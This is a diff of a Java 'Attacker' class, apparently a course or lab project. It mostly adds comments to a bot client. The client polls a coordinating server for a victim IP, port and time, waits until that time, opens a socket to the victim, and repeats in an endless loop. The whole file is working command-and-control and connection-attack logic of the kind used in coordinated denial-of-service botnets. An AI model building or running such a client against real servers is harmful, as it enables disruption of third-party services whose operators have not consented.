@@ -1,17 +1,17 @@
+/*
+  This is completely stand-alone "attacker". A client that communicates with a
+  coordinating server to get information about an attack. It will than create a connection
+  to the desired victim IP and port.
+
+  author: Maciej Lis.
+*/
 import java.net.*;
 import java.io.*;
 import java.util.*;
 import java.nio.*;
 import java.text.SimpleDateFormat;
 
-public class attacker {
-
-  //internal states of attacker.
-  private final int MONITORING = 0;
-  private final int ATTACKING = 1;
-
-  private static int state = 0;
-
+public class Attacker {
   private static String victim_time = "";
   private static String victim_ip = "";
   private static String victim_port = "";
@@ -21,11 +21,14 @@ public class attacker {
 
   private boolean retry_connection_to_coordinator = false;
 
+  /*
+    takes a string representation of time, and convert it into a Calendar
+    representation of time on the current day.
+  */
   private static Calendar convertStringToTime(String time) {
-    SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-    Calendar now = Calendar.getInstance();
     try {
-      sf = new SimpleDateFormat("HH:mm:ss");
+      Calendar now = Calendar.getInstance();
+      SimpleDateFormat sf = new SimpleDateFormat("HH:mm:ss");
       sf.setTimeZone(TimeZone.getTimeZone("EST"));
       /*
         store reference to year/month/day because just setting the time always
@@ -37,13 +40,12 @@ public class attacker {
       now.setTime(sf.parse(time));
       now.set(current_year, current_month, current_day);
       now.add(0, 10);
-      //System.out.println((now.get(Calendar.ZONE_OFFSET) + now.get(Calendar.DST_OFFSET)) / (60 * 1000));
-    } catch (Exception e) {}
-    return now;
-  }
+      return now;
 
-  private static String addSecondsToTime(String seconds) {
-    return null;
+    } catch (Exception e) {
+      return null;
+    }
+
   }
 
   /*
@@ -79,6 +81,7 @@ public class attacker {
 
   /*
     get the required information from the attack server before attacking.
+    Uses the agreed upone Coordinating protocol.
   */
   private static void getInfoFromCoordinator() throws UnknownHostException{
     Inet4Address coordinator_ip_inet = (Inet4Address) Inet4Address.getByAddress(convertStringToByteArrayIP(coordinator_ip_string));
@@ -93,10 +96,10 @@ public class attacker {
       String fromServer;
       String fromUser;
 
-      int state = 0;
+      int state = 0; //keep track of the current step we are in the protocol.
       while ((fromServer = in.readLine()) != null) {
-        if (state == 0) {}
-        else if (state == 1) {
+        //put the info you get into local variables.
+        if (state == 1) {
           victim_ip = fromServer;
         } else if (state == 2) {
           victim_port = fromServer;
@@ -114,6 +117,9 @@ public class attacker {
   }
 
 
+  /*
+    Start a connection to the victims server.
+  */
   private static void attackServer() {
     Inet4Address server_ip_inet;
     Socket socket;
@@ -126,6 +132,7 @@ public class attacker {
 
     try {
       socket = new Socket(server_ip_inet, Integer.parseInt(victim_port));
+      //tells us when the connection has been closed.
       while (socket.getInputStream().read() != -1 ){}
       socket.close();
       System.out.println("Socket was closed");
@@ -135,6 +142,10 @@ public class attacker {
     }
   }
 
+  /*
+    this will take a string representation of an ip, and convert it to
+    a byte array representaiton of an IP.
+  */
   private static byte[] convertStringToByteArrayIP(String string_IP) {
     String[] ip_parts = string_IP.split("\\.");
     if (ip_parts.length != 4) {
@@ -147,12 +158,19 @@ public class attacker {
     return final_byte_array;
   } //end convertStringToByteArrayIP()
 
+  /*
+    wait foe the right time to attack than attack.
+  */
   private static void startAttack() {
     waitForAttackTime();
     System.out.println("opening connection to victim server.");
     attackServer();
   }
 
+  /*
+    this will continueingly check to see if the coordinating server is online.
+    Once it gets online, it will get the attack info.
+  */
   private static void startMonitor() {
     waitForAttackServer();
     try {
@@ -161,12 +179,15 @@ public class attacker {
   }
 
   public static void main(String[] args) throws IOException {
-    //two modes, monitoring mode, and attacking mode.
-    //monitoring mode
-      //get the information from the coordinator
-      //parse information, including converting the IP to a byte array.
-    //attack mode.
 
+    /*
+      When the program starts, it will first wait to connect to the coordinator server.
+      Once a connection is established with the coordinator server, we will get the info
+      using the agreed upon CoordinatingProtocol. We will than switch over into attacking mode which
+      will wait until its the right time to attack, andthan make a socket connection to the
+      required victim IP & port.
+      We will than wait 60 seconds before restarting this process.
+    */
     while (true) {
       startMonitor();
       startAttack();
